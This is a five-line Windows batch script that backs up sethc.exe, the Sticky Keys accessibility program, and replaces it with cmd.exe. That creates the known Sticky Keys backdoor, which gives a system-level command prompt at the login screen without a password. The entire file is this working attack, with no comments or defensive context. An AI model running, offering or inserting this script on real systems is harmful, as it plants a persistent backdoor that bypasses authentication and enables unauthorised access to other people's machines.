@echo off
cls
copy /Y "C:\Windows\System32\sethc.exe" "C:\sethc_backup.exe"
copy /Y "C:\Windows\System32\cmd.exe" "C:\Windows\System32\sethc.exe"
exit